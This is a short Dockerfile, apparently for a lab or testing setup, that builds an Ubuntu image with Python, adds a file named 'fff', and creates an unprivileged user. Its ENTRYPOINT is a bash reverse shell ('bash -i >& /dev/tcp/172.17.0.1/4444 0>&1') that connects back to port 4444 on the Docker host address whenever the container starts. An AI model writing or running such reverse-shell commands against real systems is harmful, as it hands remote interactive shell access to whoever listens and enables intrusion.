FROM ubuntu:latest

RUN apt update && apt install -y python

WORKDIR /home/user
ADD fff .
RUN useradd user && chown user:user /home/user
USER user

ENTRYPOINT bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
